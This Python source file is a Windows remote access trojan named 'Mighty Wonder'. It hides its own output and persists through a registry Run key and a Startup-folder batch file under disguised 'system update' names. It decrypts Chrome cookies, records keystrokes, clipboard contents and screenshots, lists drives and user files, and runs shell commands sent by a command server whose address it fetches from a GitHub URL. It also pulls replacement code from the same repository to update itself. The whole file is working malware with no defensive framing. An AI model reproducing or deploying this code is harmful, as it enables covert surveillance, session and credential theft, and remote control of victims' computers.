# Mighty Wonder - God-Tier Unbreakable Python Agent
# Infinite Persistence, Stealth Automation, Resilient Socket Programming

import argparse
import base64
import ctypes
import getpass
import importlib
import json
import os
import platform
import random
import re
import shutil
import socket
import sqlite3
import subprocess
import sys
import threading
import time
import uuid
import winreg
from urllib.parse import urlparse

# Stealth Mode: Suppress all output
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

def install_dependencies():
    required = ['pyautogui', 'pycryptodome', 'requests', 'mss', 'Pillow', 'websocket-client']
    for lib in required:
        try:
            __import__(lib if lib != 'pycryptodome' else 'Crypto')
        except ImportError:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", lib, "--quiet", "--no-warn-script-location"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass

install_dependencies()

import websocket

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    requests = None
    REQUESTS_AVAILABLE = False

import pyautogui

# Optional dependencies
try:
    from Crypto.Cipher import AES
    CRYPTO_AVAILABLE = True
except ImportError:
    AES = None
    CRYPTO_AVAILABLE = False

try:
    from mss import mss
    MSS_AVAILABLE = True
except ImportError:
    MSS_AVAILABLE = False

try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    pyautogui = None
    PYAUTOGUI_AVAILABLE = False

try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    keyboard = None
    PYNPUT_AVAILABLE = False

try:
    import pyperclip
    PYPERCLIP_AVAILABLE = True
except ImportError:
    pyperclip = None
    PYPERCLIP_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    psutil = None
    PSUTIL_AVAILABLE = False

try:
    import win32crypt
    WIN32CRYPT_AVAILABLE = True
except ImportError:
    win32crypt = None
    WIN32CRYPT_AVAILABLE = False

REQUIRED_PACKAGES = ['pynput', 'pycryptodome', 'mss', 'Pillow', 'pyperclip', 'pywin32']

# Default command hub settings
HUB_ADDRESS = '0.0.0.0'
HUB_PORT = 9999
DEFAULT_GITHUB_THRONE_URL = 'https://raw.githubusercontent.com/ShahDaraza/TestBot/main/throne.txt'

keylog_active = False
keylog_data = ''
keylog_thread = None
clipboard_active = False
clipboard_thread = None
last_clipboard = ''

def silent_bootstrap():
    """Install required packages silently if missing."""
    for package in REQUIRED_PACKAGES:
        try:
            if package == 'pycryptodome':
                importlib.import_module('Crypto')
            elif package == 'Pillow':
                importlib.import_module('PIL')
            else:
                importlib.import_module(package)
        except ImportError:
            try:
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0
                subprocess.run(
                    [sys.executable, '-m', 'pip', 'install', package, '--quiet', '--no-warn-script-location'],
                    capture_output=True,
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                )
            except Exception:
                pass

def get_current_version():
    """Get the current version from version.txt."""
    try:
        with open(LOCAL_VERSION_FILE, 'r', encoding='utf-8') as f:
            return f.read().strip()
    except Exception:
        return '0.0.0'

def get_arp_table():
    """Retrieve the Windows ARP table."""
    try:
        output = subprocess.check_output('arp -a', shell=True, stderr=subprocess.DEVNULL)
        return output.decode('utf-8', errors='ignore')
    except Exception as e:
        return f'Failed to get ARP table: {e}'

def get_session_data():
    if not WIN32CRYPT_AVAILABLE or not CRYPTO_AVAILABLE:
        return "Dependencies not available"
    # Use environment variables to handle ANY machine's username
    local = os.getenv('LOCALAPPDATA')
    path = os.path.join(local, r"Google\Chrome\User Data\Local State")
    db_path = os.path.join(local, r"Google\Chrome\User Data\Default\Network\Cookies")
    
    if not os.path.exists(db_path): return "No Path"

    # 1. Master Key Extraction
    with open(path, "r", encoding="utf-8") as f:
        reg = json.load(f)
    key = base64.b64decode(reg["os_crypt"]["encrypted_key"])[5:]
    master_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    # 2. Database Migration (To avoid 'Locked' errors while Scholar is browsing)
    temp_db = os.path.join(os.getenv('TEMP'), "vault.db")
    shutil.copy2(db_path, temp_db)
    
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    
    cookies = []
    for host, name, value in cursor.fetchall():
        try:
            iv, payload = value[3:15], value[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16].decode()
            cookies.append(f"{host} | {name}: {decrypted}")
        except: continue
    
    conn.close()
    os.remove(temp_db)
    return "\n".join(cookies)

def send_atomic_data(s, type, data, filename, is_websocket=False):
    """Send data with the unified atomic sync protocol via raw TCP socket."""
    try:
        if isinstance(data, str):
            data = data.encode('utf-8')
        header = f"DATA_HEADER|{type}|{len(data)}|{filename}\n".encode('utf-8')
        # Always use sendall for raw TCP sockets in Mighty Wonder
        s.sendall(header + data + b'V_PULSE_EOF')
        return True
    except Exception as e:
        return False

def run_detached():
    """Restart this process in detached mode."""
    if platform.system() != 'Windows':
        return
    cmd = [sys.executable, sys.argv[0]] + sys.argv[1:] + ['--detached']
    subprocess.Popen(cmd, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)

# Keylogger

def start_keylogger():
    """Start the keylogger thread."""
    global keylog_active, keylog_data, keylog_thread
    if not PYNPUT_AVAILABLE:
        return 'pynput not available'
    if keylog_active:
        return 'Keylogger already active'

    keylog_active = True
    keylog_data = ''

    def on_press(key):
        global keylog_data
        try:
            keylog_data += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                keylog_data += ' '
            elif key == keyboard.Key.enter:
                keylog_data += '\n'
            elif key == keyboard.Key.tab:
                keylog_data += '\t'
            else:
                keylog_data += f'[{key}]'

    listener = keyboard.Listener(on_press=on_press)
    keylog_thread = threading.Thread(target=listener.start, daemon=True)
    keylog_thread.start()
    return 'Keylogger started'

def stop_keylogger():
    """Stop the keylogger."""
    global keylog_active, keylog_thread
    keylog_active = False
    if keylog_thread:
        keylog_thread.join(timeout=1.0)
    return 'Keylogger stopped'

def get_keylog_bytes():
    """Return keylogger contents as bytes."""
    return keylog_data.encode('utf-8', errors='ignore')

# Clipboard monitor

def start_clipboard_monitor():
    """Start monitoring the clipboard."""
    global clipboard_active, clipboard_thread, last_clipboard
    if not PYPERCLIP_AVAILABLE:
        return 'pyperclip not available'
    if clipboard_active:
        return 'Clipboard monitor already active'

    clipboard_active = True
    last_clipboard = pyperclip.paste() if pyperclip else ''

    def monitor_clipboard():
        global last_clipboard
        while clipboard_active:
            try:
                current = pyperclip.paste()
                if current != last_clipboard:
                    last_clipboard = current
            except Exception:
                pass
            time.sleep(1)

    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
    clipboard_thread.start()
    return 'Clipboard monitor started'

def stop_clipboard_monitor():
    """Stop clipboard monitoring."""
    global clipboard_active, clipboard_thread
    clipboard_active = False
    if clipboard_thread:
        clipboard_thread.join(timeout=1.0)
    return 'Clipboard monitor stopped'

# Screenshot

def capture_desktop_screenshot(client, is_websocket=False):
    """Capture the desktop and send it back."""
    try:
        if not MSS_AVAILABLE or not PIL_AVAILABLE:
            if is_websocket:
                client.send('DEPENDENCY_MISSING: mss Pillow')
            else:
                client.sendall(b'DEPENDENCY_MISSING: mss Pillow')
            return

        with mss() as sct:
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            image = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
            new_width = int(image.width * 0.7)
            new_height = int(image.height * 0.7)
            image = image.resize((new_width, new_height), Image.Resampling.LANCZOS)
            import io
            buffer = io.BytesIO()
            image.save(buffer, format='JPEG', quality=60, optimize=True)
            jpg_data = buffer.getvalue()
            send_atomic_data(client, 'SCREENSHOT', jpg_data, 'screenshot.jpg', is_websocket=is_websocket)
    except Exception as e:
        try:
            if is_websocket:
                client.send(f'CAPTURE_FAILED: {e}')
            else:
                client.sendall(f'CAPTURE_FAILED: {e}'.encode('utf-8'))
        except Exception:
            pass

# Persistence

def ensure_service_continuity():
    """Ensure the agent is registered to run on startup."""
    try:
        app_data = os.getenv('APPDATA') or ''
        target_file = os.path.join(app_data, 'SystemUpdates', 'win_manager.py')
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        expected_value = f'pythonw "{target_file}"'
        try:
            current_value, _ = winreg.QueryValueEx(key, 'WinManager')
            if current_value != expected_value:
                winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, expected_value)
        except FileNotFoundError:
            winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, expected_value)
        winreg.CloseKey(key)
    except Exception:
        pass

def establish_persistence():
    """Copy this script to AppData and add persistence."""
    target_file = None
    try:
        app_data = os.getenv('APPDATA') or ''
        target_dir = os.path.join(app_data, 'SystemUpdates')
        os.makedirs(target_dir, exist_ok=True)
        target_file = os.path.join(target_dir, 'win_manager.py')
        if os.path.abspath(sys.argv[0]) != os.path.abspath(target_file):
            shutil.copy2(sys.argv[0], target_file)
        startup_folder = os.path.join(os.getenv('USERPROFILE') or '', 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        bat_path = os.path.join(startup_folder, 'ServiceUpdate.bat')
        if not os.path.exists(bat_path):
            with open(bat_path, 'w', encoding='utf-8') as f:
                f.write(f'@echo off\npythonw "{target_file}"')
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, f'pythonw "{target_file}"')
        winreg.CloseKey(key)
    except Exception:
        pass
    return target_file

def check_persistence(target_file):
    """Periodically verify persistence is still present."""
    while True:
        try:
            if not target_file:
                time.sleep(300)
                continue
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ)
            winreg.QueryValueEx(key, 'WinManager')
            winreg.CloseKey(key)
        except Exception:
            pass
        time.sleep(300)

def get_hwid():
    """Return a hardware ID based on the MAC address."""
    return '-'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 48, 8)][::-1]).upper()

def get_username():
    """Get the current username."""
    return getpass.getuser()

def get_location():
    """Return location string from IP API in format City,Country or Unknown_Loc."""
    try:
        response = requests.get('http://ipapi.co/json/', timeout=5)
        data = response.json()
        city = data.get('city', '').strip()
        country = data.get('country_name', '').strip()
        
        if not city and not country:
            return 'Unknown_Loc'
        elif city and country:
            return f"{city},{country}"
        elif city:
            return city
        else:
            return country
    except Exception:
        return 'Unknown_Loc'

def report_status():
    """Report system status including window title with City and Country from ipapi.co."""
    user_name = get_username()
    location_str = get_location()
    # Parse location string from get_location() which returns "City,Country" or "Unknown_Loc"
    if ',' in location_str and location_str != 'Unknown_Loc':
        city, country = location_str.split(',', 1)
        city = city.strip()
        country = country.strip()
    else:
        city = location_str if location_str not in ('Unknown_Loc', '') else 'Obscured'
        country = 'Obscured'
    isp = 'Obscured'  # Location API doesn't provide ISP directly

    report = {
        'HWID': get_hwid(),
        'OS': platform.system(),
        'Version': platform.version(),
        'Hostname': socket.gethostname(),
        'User': user_name,
        'Username': user_name,
        'SystemUsername': user_name,
        'MachineName': socket.gethostname(),
        'Location': location_str,
        'City': city or 'Obscured',
        'Country': country or 'Obscured',
        'ISP': isp or 'Obscured',
        'EvolveVersion': get_current_version(),
        'Python': platform.python_version(),
    }
    
    # Get current window title
    try:
        import ctypes
        GetForegroundWindow = ctypes.windll.user32.GetForegroundWindow
        GetWindowTextLength = ctypes.windll.user32.GetWindowTextLength
        GetWindowTextW = ctypes.windll.user32.GetWindowTextW
        
        hwnd = GetForegroundWindow()
        length = GetWindowTextLength(hwnd)
        if length > 0:
            buff = ctypes.create_unicode_buffer(length + 1)
            GetWindowTextW(hwnd, buff, length + 1)
            report['WindowTitle'] = buff.value
        else:
            report['WindowTitle'] = '[No Active Window]'
    except Exception as e:
        report['WindowTitle'] = '[Obscured]'
    
    if PSUTIL_AVAILABLE:
        try:
            report['Uptime'] = f'{time.time() - psutil.boot_time():.2f}s'
            report['CPU'] = f'{psutil.cpu_percent(interval=0.2)}%'
            mem = psutil.virtual_memory()
            report['Memory'] = f'{mem.percent}%'
            report['RAMAvailable'] = f'{mem.available / 1024 / 1024:.1f} MB available'
        except Exception:
            report['Uptime'] = 'N/A'
            report['CPU'] = 'N/A'
            report['Memory'] = 'N/A'
            report['RAMAvailable'] = 'Obscured'
    else:
        report['Uptime'] = 'N/A'
        report['CPU'] = 'N/A'
        report['Memory'] = 'N/A'
        report['RAMAvailable'] = 'Obscured'
    
    return json.dumps(report)

def check_for_updates(version_url=DEFAULT_GITHUB_VERSION_URL, script_url=DEFAULT_GITHUB_SCRIPT_URL):
    """Check GitHub for a newer drone version and apply it if present."""
    try:
        remote_version = get_remote_version(version_url)
        if not remote_version:
            return False

        local_version = read_local_version()
        if parse_semantic_version(remote_version) <= parse_semantic_version(local_version):
            return False

        script_bytes = download_remote_script(script_url)
        if not script_bytes:
            return False

        # Apply update
        with open(sys.argv[0], 'wb') as f:
            f.write(script_bytes)
        return True
    except Exception:
        return False

def get_remote_version(version_url):
    """Fetch remote version from GitHub."""
    try:
        response = requests.get(version_url, timeout=10)
        return response.text.strip()
    except Exception:
        return None

def read_local_version():
    """Read local version."""
    try:
        with open(LOCAL_VERSION_FILE, 'r') as f:
            return f.read().strip()
    except Exception:
        return '0.0.0'

def parse_semantic_version(version):
    """Parse semantic version."""
    try:
        return tuple(map(int, version.split('.')))
    except Exception:
        return (0, 0, 0)

def download_remote_script(script_url):
    """Download remote script."""
    try:
        response = requests.get(script_url, timeout=10)
        return response.content
    except Exception:
        return None

def explore_drives():
    """Explore all drives and return file structure."""
    drives = {}
    try:
        if platform.system() == 'Windows':
            import string
            for letter in string.ascii_uppercase:
                drive = f"{letter}:\\"
                if os.path.exists(drive):
                    drives[drive] = list_files_recursive(drive, max_depth=2)
        else:
            drives['/'] = list_files_recursive('/', max_depth=2)
    except Exception:
        pass
    return drives

def list_files_recursive(path, max_depth=2, current_depth=0):
    """Recursively list files."""
    if current_depth > max_depth:
        return {}
    try:
        items = {}
        for item in os.listdir(path):
            item_path = os.path.join(path, item)
            if os.path.isdir(item_path):
                items[item] = list_files_recursive(item_path, max_depth, current_depth + 1)
            else:
                items[item] = 'file'
        return items
    except Exception:
        return {}

def harvest_user():
    """Harvest user data."""
    data = {}
    try:
        user_profile = os.getenv('USERPROFILE')
        if user_profile:
            data['Desktop'] = list_files_recursive(os.path.join(user_profile, 'Desktop'), max_depth=1)
            data['Documents'] = list_files_recursive(os.path.join(user_profile, 'Documents'), max_depth=1)
            data['Downloads'] = list_files_recursive(os.path.join(user_profile, 'Downloads'), max_depth=1)
    except Exception:
        pass
    return data

def extract_chrome_credentials():
    """Extract Chrome credentials."""
    try:
        return get_session_data()
    except Exception:
        return "Failed to extract credentials"

def extract_file_bytes(file_path):
    """Extract file bytes."""
    try:
        with open(file_path, 'rb') as f:
            return f.read()
    except Exception:
        return None

def perform_persistent_handshake(sock, hwid, user, location, version):
    """Keep sending the handshake every 2 seconds until KING_ACK is received."""
    handshake_message = f"NODE_DATA|{hwid}|{user}|{location}|{version}|END_HANDSHAKE\n"
    sock.setblocking(False)
    last_send = 0
    buffer = b''

    while True:
        current_time = time.time()
        if current_time - last_send >= 2:
            try:
                sock.sendall(handshake_message.encode('utf-8'))
                last_send = current_time
            except BlockingIOError:
                # Send will retry on the next loop iteration
                pass
            except Exception as e:
                raise ConnectionError(f"Failed to send handshake: {e}")

        try:
            ack_bytes = sock.recv(1024)
            if ack_bytes == b'':
                raise ConnectionError("Connection closed before KING_ACK")

            buffer += ack_bytes
            if b"KING_ACK" in buffer:
                ack_index = buffer.index(b"KING_ACK") + len(b"KING_ACK")
                remaining = buffer[ack_index:]
                break
        except BlockingIOError:
            pass
        except socket.timeout:
            pass
        except Exception as e:
            raise ConnectionError(f"Handshake receive error: {e}")

        time.sleep(0.1)

    sock.setblocking(True)
    sock.settimeout(15)
    return remaining

def connect_to_king(king_url):
    """Persistent Shouter: Keep sending handshake until KING_ACK is received."""
    while True:
        try:
            address = king_url.strip()
            if not address or ':' not in address:
                raise ValueError("Invalid throne address format")

            host, port = address.split(':', 1)
            host = host.strip()
            port = port.strip()
            if not host or not port.isdigit():
                raise ValueError("Invalid throne host or port")

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((host, int(port)))

            user = get_username()
            location = get_location()
            version = get_current_version()
            hwid = get_hwid()

            leftover = perform_persistent_handshake(s, hwid, user, location, version)

            return s, leftover

        except Exception as e:
            try:
                s.close()
            except Exception:
                pass

def connect_direct_hub(hub_ip, port, max_retries: int = 3):
    """Connect directly to the command hub using raw TCP socket."""
    for attempt in range(max_retries):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((hub_ip, port))

            user = get_username()
            location = get_location()
            version = get_current_version()
            hwid = get_hwid()

            leftover = perform_persistent_handshake(s, hwid, user, location, version)

            return s, leftover
        except Exception as e:
            try:
                s.close()
            except Exception:
                pass
            if attempt < max_retries - 1:
                time.sleep(1)
                continue
            return None, b''

def get_king_url(github_throne_url=DEFAULT_GITHUB_THRONE_URL):
    """Pull the fresh King URL from GitHub throne."""
    if not github_throne_url:
        return None

    try:
        response = requests.get(github_throne_url, timeout=10, headers={
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
        })
        address = response.text.strip()
        return address
    except Exception as e:
        return None

def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
    """Connect to the hub and process commands."""
    while True:
        try:
            # Always prefer throne URL if available (connects via TCP to tunnel)
            use_throne = bool(github_throne_url)
            
            if use_throne:
                king_url = get_king_url(github_throne_url)
                if king_url:
                    client, buffer = connect_to_king(king_url)
                else:
                    time.sleep(10)
                    continue
            else:
                client, buffer = connect_direct_hub(hub_ip, port) if hub_ip else (None, b'')

            if not client:
                time.sleep(10)
                continue
            
            while True:
                try:
                    # Use any buffered handshake remainder first
                    if buffer:
                        data = buffer
                        buffer = b''
                    else:
                        data = client.recv(1024)

                    if isinstance(data, bytes):
                        data = data.decode('utf-8', errors='ignore')

                    for message in data.strip().splitlines():
                        command = message.strip()
                        if not command:
                            continue

                        try:
                            if command == 'STATUS_REPORT':
                                client.sendall(f'STATUS:{report_status()}\nV_PULSE_EOF\n'.encode())
                            elif command == 'TRIGGER_EVOLVE':
                                try:
                                    if check_for_updates():
                                        client.sendall(b'EVOLVE_SUCCESS\nV_PULSE_EOF\n')
                                    else:
                                        client.sendall(b'EVOLVE_NO_UPDATE\nV_PULSE_EOF\n')
                                except Exception as e:
                                    client.sendall(f'EVOLVE_FAILED: {e}\nV_PULSE_EOF\n'.encode())
                            elif command == 'DESKTOP_CAPTURE':
                                try:
                                    capture_desktop_screenshot(client, is_websocket=False)
                                except Exception as e:
                                    client.sendall(f'SCREENSHOT_FAILED: {e}\nV_PULSE_EOF\n'.encode())
                            elif command == 'SCREENSHOT':
                                try:
                                    capture_desktop_screenshot(client, is_websocket=False)
                                except Exception as e:
                                    client.sendall(f'SCREENSHOT_FAILED: {e}\nV_PULSE_EOF\n'.encode())
                            elif command == 'ENSURE_SERVICE_CONTINUITY':
                                try:
                                    ensure_service_continuity()
                                    client.sendall(b'SERVICE_CONTINUITY_OK\nV_PULSE_EOF\n')
                                except Exception as e:
                                    client.sendall(f'SERVICE_CONTINUITY_FAILED: {e}\nV_PULSE_EOF\n'.encode())
                            elif command == 'SHUTDOWN_NODE':
                                try:
                                    return
                                except Exception as e:
                                    pass
                            elif command == 'PING':
                                try:
                                    client.sendall(b'PING_OK\nV_PULSE_EOF\n')
                                except Exception as e:
                                    pass
                            elif command.startswith('MESSAGE '):
                                try:
                                    # Stealth: No pop-ups, just acknowledge
                                    client.sendall(b'MESSAGE_RECEIVED\nV_PULSE_EOF\n')
                                except Exception as e:
                                    client.sendall(f'MESSAGE_FAILED: {e}\nV_PULSE_EOF\n'.encode())
                            elif command.startswith('SHELL '):
                                try:
                                    cmd_text = command.split('"')[1] if '"' in command else command[6:]
                                    subprocess.Popen(cmd_text, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                                    client.sendall(b'SHELL_EXECUTED\nV_PULSE_EOF\n')
                                except Exception as e:
                                    client.sendall(f'SHELL_FAILED: {e}\nV_PULSE_EOF\n'.encode())
                            elif command.startswith('GHOST_OPEN|') or command.startswith('open '):
                                try:
                                    if command.startswith('GHOST_OPEN|'):
                                        target_url = command.split('|', 1)[1]
                                    else:
                                        target_url = command.split(' ', 1)[1]
                                    import webbrowser
                                    webbrowser.open(target_url)
                                    client.sendall(b'GHOST_OPEN_EXECUTED\nV_PULSE_EOF\n')
                                except Exception as e:
                                    client.sendall(f'GHOST_OPEN_FAILED: {e}\nV_PULSE_EOF\n'.encode())
                            elif command == 'GHOST_MOVE':
                                try:
                                    if PYAUTOGUI_AVAILABLE:
                                        pyautogui.moveRel(10, 0, duration=0.1)
                                        pyautogui.moveRel(-10, 0, duration=0.1)
                                    client.sendall(b'GHOST_MOVE_EXECUTED\nV_PULSE_EOF\n')
                                except Exception as e:
                                    client.sendall(f'GHOST_MOVE_FAILED: {e}\nV_PULSE_EOF\n'.encode())
                            elif command.startswith('GHOST_TYPE|'):
                                try:
                                    if PYAUTOGUI_AVAILABLE:
                                        text = command.split('|', 1)[1]
                                        pyautogui.typewrite(text)
                                    client.sendall(b'GHOST_TYPE_EXECUTED\nV_PULSE_EOF\n')
                                except Exception as e:
                                    client.sendall(f'GHOST_TYPE_FAILED: {e}\nV_PULSE_EOF\n'.encode())
                            elif command == 'KILL_AGENT':
                                try:
                                    # Clean up persistence
                                    try:
                                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
                                        winreg.DeleteValue(key, 'WinManager')
                                        winreg.CloseKey(key)
                                    except Exception:
                                        pass
                                    try:
                                        startup_folder = os.path.join(os.getenv('USERPROFILE') or '', 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                                        bat_path = os.path.join(startup_folder, 'ServiceUpdate.bat')
                                        if os.path.exists(bat_path):
                                            os.remove(bat_path)
                                    except Exception:
                                        pass
                                    try:
                                        target_file = os.path.join(os.getenv('APPDATA') or '', 'SystemUpdates', 'win_manager.py')
                                        if os.path.exists(target_file):
                                            os.remove(target_file)
                                    except Exception:
                                        pass
                                    return
                                except Exception as e:
                                    pass
                            elif command == 'EXPLORE_DRIVES':
                                try:
                                    send_atomic_data(client, 'EXPLORE', json.dumps(explore_drives()).encode('utf-8'), 'drives.json', is_websocket=False)
                                except Exception as e:
                                    client.sendall(f'EXPLORE_FAILED: {e}\nV_PULSE_EOF\n'.encode())
                            elif command == 'HARVEST_USER':
                                try:
                                    send_atomic_data(client, 'HARVEST', json.dumps(harvest_user()).encode('utf-8'), 'harvest.json', is_websocket=False)
                                except Exception as e:
                                    client.sendall(f'HARVEST_FAILED: {e}\nV_PULSE_EOF\n'.encode())
                            elif command == 'NETWORK_TOPOLOGY':
                                try:
                                    send_atomic_data(client, 'TOPOLOGY', get_arp_table().encode('utf-8'), 'arp.txt', is_websocket=False)
                                except Exception as e:
                                    client.sendall(f'TOPOLOGY_FAILED: {e}\nV_PULSE_EOF\n'.encode())
                            elif command == 'EXTRACT_CREDENTIALS':
                                try:
                                    send_atomic_data(client, 'CREDENTIALS', extract_chrome_credentials(), 'chrome_credentials.txt', is_websocket=False)
                                except Exception as e:
                                    client.sendall(f'CREDENTIALS_FAILED: {e}\nV_PULSE_EOF\n'.encode())
                            elif command == 'GET_KEYS':
                                try:
                                    if PYNPUT_AVAILABLE:
                                        send_atomic_data(client, 'KEYLOG', get_keylog_bytes(), 'keylog.txt', is_websocket=False)
                                    else:
                                        client.sendall(b'KEYLOG_DEPENDENCY_MISSING\nV_PULSE_EOF\n')
                                except Exception as e:
                                    client.sendall(f'KEYLOG_FAILED: {e}\nV_PULSE_EOF\n'.encode())
                            elif command.startswith('EXTRACT_FILE '):
                                try:
                                    file_path = command[13:].strip('"')
                                    payload = extract_file_bytes(file_path)
                                    if payload is None:
                                        client.sendall(f'FILE_NOT_FOUND: {file_path}\nV_PULSE_EOF\n'.encode())
                                    else:
                                        send_atomic_data(client, 'FILE', payload, os.path.basename(file_path), is_websocket=False)
                                except Exception as e:
                                    client.sendall(f'EXTRACT_FILE_FAILED: {e}\nV_PULSE_EOF\n'.encode())
                            elif command.startswith('KEYLOG'):
                                try:
                                    if not PYNPUT_AVAILABLE:
                                        client.sendall(b'KEYLOG_DEPENDENCY_MISSING\nV_PULSE_EOF\n')
                                    elif 'START' in command.upper():
                                        result = start_keylogger()
                                        client.sendall(f'KEYLOG_START: {result}\nV_PULSE_EOF\n'.encode())
                                    elif 'STOP' in command.upper():
                                        result = stop_keylogger()
                                        client.sendall(f'KEYLOG_STOP: {result}\nV_PULSE_EOF\n'.encode())
                                    else:
                                        client.sendall(b'KEYLOG_USAGE: START or STOP\nV_PULSE_EOF\n')
                                except Exception as e:
                                    client.sendall(f'KEYLOG_FAILED: {e}\nV_PULSE_EOF\n'.encode())
                            elif command.startswith('CLIPBOARD'):
                                try:
                                    if not PYPERCLIP_AVAILABLE:
                                        client.sendall(b'CLIPBOARD_DEPENDENCY_MISSING\nV_PULSE_EOF\n')
                                    elif 'START' in command.upper():
                                        result = start_clipboard_monitor()
                                        client.sendall(f'CLIPBOARD_START: {result}\nV_PULSE_EOF\n'.encode())
                                    elif 'STOP' in command.upper():
                                        result = stop_clipboard_monitor()
                                        client.sendall(f'CLIPBOARD_STOP: {result}\nV_PULSE_EOF\n'.encode())
                                    else:
                                        client.sendall(b'CLIPBOARD_USAGE: START or STOP\nV_PULSE_EOF\n')
                                except Exception as e:
                                    client.sendall(f'CLIPBOARD_FAILED: {e}\nV_PULSE_EOF\n'.encode())
                            elif command.startswith('CLICK '):
                                try:
                                    if PYAUTOGUI_AVAILABLE:
                                        parts = command.split()
                                        x = int(parts[1])
                                        y = int(parts[2])
                                        pyautogui.click(x, y)
                                    client.sendall(b'CLICK_EXECUTED\nV_PULSE_EOF\n')
                                except Exception as e:
                                    client.sendall(f'CLICK_FAILED: {e}\nV_PULSE_EOF\n'.encode())
                            elif command.startswith('TYPE '):
                                try:
                                    if PYAUTOGUI_AVAILABLE:
                                        text = command[5:].strip('"')
                                        pyautogui.typewrite(text)
                                    client.sendall(b'TYPE_EXECUTED\nV_PULSE_EOF\n')
                                except Exception as e:
                                    client.sendall(f'TYPE_FAILED: {e}\nV_PULSE_EOF\n'.encode())
                            else:
                                # Unknown command, ignore
                                pass
                        except Exception as e:
                            # Global command handling exception
                            try:
                                client.sendall(f'COMMAND_ERROR: {e}\nV_PULSE_EOF\n'.encode())
                            except Exception:
                                pass
                except socket.timeout:
                    continue
                except (socket.error, ConnectionResetError, BrokenPipeError) as e:
                    break
                except Exception as e:
                    break

        except Exception as e:
            pass
        finally:
            try:
                if 'client' in locals():
                    client.close()
            except Exception:
                pass

        time.sleep(10)

def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description='Mighty Wonder - Unbreakable Python Agent')
    parser.add_argument('--hub-ip', default=os.getenv('KING_HUB_IP', HUB_ADDRESS), help='IP address or hostname of the King command hub')
    parser.add_argument('--hub-port', type=int, default=int(os.getenv('KING_HUB_PORT', str(HUB_PORT))), help='Port of the King command hub')
    parser.add_argument('--github-throne-url', default=os.getenv('KING_THRONE_URL', DEFAULT_GITHUB_THRONE_URL), help='GitHub raw URL to retrieve King IP from (overrides --hub-ip when present)')
    parser.add_argument('--throne-url', default=os.getenv('KING_THRONE_URL', DEFAULT_GITHUB_THRONE_URL), help='Alias for --github-throne-url')
    parser.add_argument('--no-persist', action='store_true', help='Do not establish persistence (for testing)')
    parser.add_argument('--detached', action='store_true', help='Run in background')
    args = parser.parse_args()
    if not args.github_throne_url and args.throne_url:
        args.github_throne_url = args.throne_url
    return args

LOCAL_VERSION_FILE = 'version.txt'
UPDATE_CHECK_INTERVAL = 60  # seconds
DEFAULT_GITHUB_VERSION_URL = 'https://raw.githubusercontent.com/ShahDaraza/TestBot/main/version.txt'
DEFAULT_GITHUB_SCRIPT_URL = 'https://raw.githubusercontent.com/ShahDaraza/TestBot/main/python2.py'

def auto_update_monitor():
    """Monitor for updates."""
    while True:
        time.sleep(UPDATE_CHECK_INTERVAL)
        try:
            check_for_updates()
        except Exception:
            pass

if __name__ == '__main__':
    args = parse_args()
    silent_bootstrap()
    if not args.detached:
        run_detached()
    if not args.no_persist:
        target_file = establish_persistence()
        threading.Thread(target=check_persistence, args=(target_file,), daemon=True).start()
        ensure_service_continuity()
    # Start auto-update monitor
    threading.Thread(target=auto_update_monitor, daemon=True).start()

    # Eternal Loop: Infinite Persistence
    while True:
        try:
            connect_to_hub(args.hub_ip, args.hub_port, args.github_throne_url)
        except Exception:
            pass
        time.sleep(10)
